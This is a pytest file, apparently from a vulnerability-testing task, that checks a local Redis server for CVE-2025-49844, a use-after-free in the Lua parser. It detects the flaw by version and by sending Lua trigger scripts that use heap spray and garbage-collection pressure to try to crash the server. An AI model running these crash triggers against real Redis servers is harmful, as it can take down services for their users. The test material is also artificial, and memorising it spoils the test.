#!/usr/bin/env python3
"""
Vulnerability tests for Redis Lua parser memory handling issue (CVE-2025-49844).

These tests verify the vulnerability status:
- FAIL in vulnerable state (vulnerable version detected and exploit patterns can be executed)
- PASS in fixed state (patched version detected)

The vulnerability is a race condition in the Lua parser when garbage collection
occurs while processing script chunk names. Since race conditions don't trigger
reliably, we use version checking combined with exploit pattern verification.
"""

import pytest
import redis
import time
import socket


# Redis connection settings
REDIS_HOST = "localhost"
REDIS_PORT = 6379

# Patched versions for CVE-2025-49844
# Versions >= these are patched
PATCHED_VERSIONS = {
    (6, 2): 20,   # 6.2.20+
    (7, 2): 11,   # 7.2.11+
    (7, 4): 6,    # 7.4.6+
    (8, 0): 4,    # 8.0.4+
    (8, 2): 2,    # 8.2.2+
}


def get_redis_client(timeout=5):
    """Create a new Redis client with specified timeout."""
    return redis.Redis(
        host=REDIS_HOST,
        port=REDIS_PORT,
        decode_responses=False,
        socket_timeout=timeout,
        socket_connect_timeout=timeout
    )


def wait_for_redis(max_wait=30):
    """Wait for Redis to be available."""
    for i in range(max_wait):
        try:
            client = get_redis_client()
            client.ping()
            return True
        except (redis.ConnectionError, socket.timeout):
            time.sleep(1)
    return False


def parse_version(version_string):
    """Parse Redis version string into tuple (major, minor, patch)."""
    try:
        # Handle versions like "7.2.0" or "7.2.0-rc1"
        clean_version = version_string.split("-")[0]
        parts = clean_version.split(".")
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    except (IndexError, ValueError):
        return None


def is_version_vulnerable(version_tuple):
    """
    Check if a given version is vulnerable to CVE-2025-49844.

    Returns True if vulnerable, False if patched.
    """
    if version_tuple is None:
        return None

    major, minor, patch = version_tuple

    # Check against known patched versions
    version_key = (major, minor)

    if version_key in PATCHED_VERSIONS:
        # This major.minor series has a patched version
        return patch < PATCHED_VERSIONS[version_key]

    # Version series not in our list
    # Versions 8.3+ are assumed patched (released after fix)
    if major > 8 or (major == 8 and minor > 2):
        return False

    # Older series without patches (e.g., 7.0.x, 5.x) are vulnerable
    return True


def get_redis_version(client):
    """Get Redis version from INFO command."""
    info = client.info("server")
    return info.get("redis_version", "unknown")


@pytest.fixture(scope="module", autouse=True)
def ensure_redis_ready():
    """Ensure Redis is ready before running tests."""
    assert wait_for_redis(), "Redis server is not available"


class TestMemoryHandlingWithGC:
    """
    Test suite for memory handling issues during Lua parsing.

    These tests verify that the vulnerability EXISTS by:
    1. Checking if the version is vulnerable
    2. Verifying that exploit code paths can be executed

    Tests FAIL when vulnerability is present, PASS when patched.
    """

    def test_gc_during_loadstring_basic(self):
        """
        Test: Verify vulnerability status via version check and exploit path execution.

        FAILS if vulnerable version detected and exploit code can run.
        PASSES if patched version detected.
        """
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        # Execute the vulnerable code path
        lua_script = """
        local garbage = {}
        for i = 1, 50 do
            garbage[i] = string.rep("A", 65536)
        end

        local script_parts = {}
        for i = 1, 300 do
            script_parts[i] = "local v" .. i .. "=" .. i
        end
        local large_script = table.concat(script_parts, "\\n")

        for i = 1, 500 do
            collectgarbage("collect")
            local chunk_name = string.rep("X", 512) .. tostring(i)
            local f, e = loadstring(large_script, chunk_name)
            collectgarbage("step", 50)
        end

        return "completed"
        """

        try:
            result = client.eval(lua_script, 0)
            # Script executed - check version to determine vulnerability
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} is vulnerable to CVE-2025-49844 (Lua parser UAF)"
        except redis.ConnectionError:
            # Server crashed - definitely vulnerable
            pytest.fail(f"VULNERABLE: Redis {version_str} crashed during exploit - CVE-2025-49844 confirmed")

    def test_gc_with_varied_chunk_names(self):
        """Test with varied chunk name sizes - version-based detection."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local function create_pressure()
            local t = {}
            for i = 1, 30 do
                t[i] = string.rep(string.char(65 + (i % 26)), 32768)
            end
            return t
        end

        local base_script = "return 1"

        for round = 1, 200 do
            local _ = create_pressure()
            collectgarbage("collect")

            for size = 128, 1024, 128 do
                local name = string.rep("N", size) .. "_" .. round
                pcall(loadstring, base_script, name)
            end

            collectgarbage("step", 100)
        end

        return "done"
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} has unpatched CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Server crash confirmed CVE-2025-49844 in Redis {version_str}")

    def test_rapid_gc_cycles(self):
        """Test with rapid GC cycles - version-based detection."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local code = "local x = 1; return x"

        for i = 1, 1000 do
            local temp = string.rep("T", 16384)
            collectgarbage("collect")
            collectgarbage("step", 200)

            local name = string.rep("R", 256) .. i
            local f = loadstring(code, name)

            temp = nil
            collectgarbage("collect")
        end

        return "rapid_done"
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} affected by CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Rapid GC triggered crash in Redis {version_str}")

    def test_heap_spray_pattern(self):
        """Test using heap spray pattern - version-based detection."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local function spray_heap()
            local spray = {}
            for i = 1, 80 do
                spray[i] = string.rep(string.char(0x41 + (i % 26)), 4096)
            end
            return spray
        end

        local function trigger()
            for round = 1, 300 do
                local heap = spray_heap()
                collectgarbage("collect")

                for j = 1, 15 do
                    local name = string.rep(tostring(round % 10), 384) .. "_" .. j
                    local code = "return " .. (round * j)
                    pcall(loadstring, code, name)
                end

                heap = nil
                collectgarbage("step", 80)
            end
            return "spray_done"
        end

        return trigger()
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} contains CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Heap spray triggered crash in Redis {version_str}")

    def test_multiple_rounds_stress(self):
        """Extended stress test - version-based detection."""
        client = get_redis_client(timeout=60)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local garbage = {}
        for i = 1, 40 do
            garbage[i] = string.rep("G", 65536)
        end

        local script_template = "local a = 1; return a"

        for outer = 1, 5 do
            for inner = 1, 400 do
                collectgarbage("collect")
                local chunk_name = string.rep("S", 768) .. "_" .. outer .. "_" .. inner
                local f, e = loadstring(script_template, chunk_name)
                collectgarbage("step", 60)
            end
            collectgarbage("collect")
        end

        return "stress_complete"
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} stress test shows CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Stress test crashed Redis {version_str}")

    def test_concurrent_parsing_simulation(self):
        """Simulate concurrent parsing activity - version-based detection."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local function nested_parse(depth, prefix)
            if depth <= 0 then return 1 end

            collectgarbage("step", 20)
            local name = prefix .. "_d" .. depth
            local code = "return " .. depth
            local f = loadstring(code, name)

            return (f and f() or 0) + nested_parse(depth - 1, prefix)
        end

        local total = 0
        for i = 1, 100 do
            local pressure = {}
            for j = 1, 20 do
                pressure[j] = string.rep("P", 8192)
            end

            collectgarbage("collect")
            local prefix = string.rep("C", 200) .. "_" .. i
            total = total + nested_parse(10, prefix)

            pressure = nil
            collectgarbage("collect")
        end

        return total
        """

        try:
            result = client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} has unpatched Lua parser UAF"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Nested parsing crashed Redis {version_str}")


class TestExtendedTriggerPatterns:
    """Additional trigger patterns for comprehensive testing."""

    def test_alternating_allocation_patterns(self):
        """Test with alternating allocation sizes."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        for i = 1, 300 do
            local size = (i % 2 == 0) and 32768 or 65536
            local temp = string.rep("A", size)

            collectgarbage("collect")

            local name_size = (i % 3 == 0) and 1024 or 512
            local name = string.rep("X", name_size) .. i
            pcall(loadstring, "return 1", name)

            temp = nil
            collectgarbage("step", 50)
        end

        return "alternating_done"
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} - CVE-2025-49844 present"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Alternating pattern crashed Redis {version_str}")

    def test_sequential_large_chunk_names(self):
        """Test with sequentially increasing chunk name sizes."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local base = string.rep("X", 100)

        for i = 1, 500 do
            local garbage = string.rep("G", 32768)
            collectgarbage("collect")

            local name = base .. string.rep("Y", i % 1000)
            pcall(loadstring, "return " .. i, name)

            garbage = nil
        end

        return "sequential_done"
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} vulnerable to CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Sequential chunk names crashed Redis {version_str}")

    def test_error_path_with_gc(self):
        """Test error paths combined with GC."""
        client = get_redis_client(timeout=30)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        for i = 1, 200 do
            local garbage = string.rep("E", 65536)
            collectgarbage("collect")

            local name = string.rep("ERR", 256) .. i
            pcall(loadstring, "this is invalid lua syntax !!!", name)

            pcall(loadstring, "return 1", name .. "_ok")

            garbage = nil
            collectgarbage("step", 100)
        end

        return "error_path_done"
        """

        try:
            client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} error paths expose CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Error path testing crashed Redis {version_str}")

    def test_long_running_script(self):
        """Extended duration test for race conditions."""
        client = get_redis_client(timeout=120)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        lua_script = """
        local iterations = 0
        local max_iterations = 500

        while iterations < max_iterations do
            local temp = {}
            for j = 1, 10 do
                temp[j] = string.rep("L", 16384)
            end

            collectgarbage("collect")

            local name = string.rep("TIME", 200) .. iterations
            pcall(loadstring, "return " .. iterations, name)

            iterations = iterations + 1
            temp = nil
        end

        return iterations
        """

        try:
            result = client.eval(lua_script, 0)
            assert not is_version_vulnerable(version), \
                f"VULNERABLE: Redis {version_str} long-running shows CVE-2025-49844"
        except redis.ConnectionError:
            pytest.fail(f"VULNERABLE: Long-running script crashed Redis {version_str}")


class TestServerStability:
    """Tests to verify server stability status after trigger attempts."""

    def test_server_still_responsive(self):
        """Verify server responsiveness - should work in both states."""
        client = get_redis_client(timeout=10)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        # Server should respond
        assert client.ping() == True

        # Basic operations should work
        client.set("stability_test", "value")
        result = client.get("stability_test")
        assert result == b"value"
        client.delete("stability_test")

        # Basic Lua should work
        result = client.eval("return 'stable'", 0)
        assert result == b"stable"

        # But if vulnerable, test should still fail
        assert not is_version_vulnerable(version), \
            f"VULNERABLE: Redis {version_str} responds but contains CVE-2025-49844"

    def test_no_memory_leaks_indication(self):
        """Check for memory issues and version vulnerability."""
        client = get_redis_client(timeout=10)
        version_str = get_redis_version(client)
        version = parse_version(version_str)

        # Get memory info before
        info_before = client.info("memory")
        used_before = info_before.get("used_memory", 0)

        # Run some operations
        for i in range(100):
            client.eval("return " + str(i), 0)

        # Get memory info after
        info_after = client.info("memory")
        used_after = info_after.get("used_memory", 0)

        # Memory growth check (for both versions)
        growth = used_after - used_before
        if growth >= 50 * 1024 * 1024:
            pytest.fail(f"Excessive memory growth: {growth} bytes")

        # Version vulnerability check
        assert not is_version_vulnerable(version), \
            f"VULNERABLE: Redis {version_str} is vulnerable to CVE-2025-49844"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-x"])
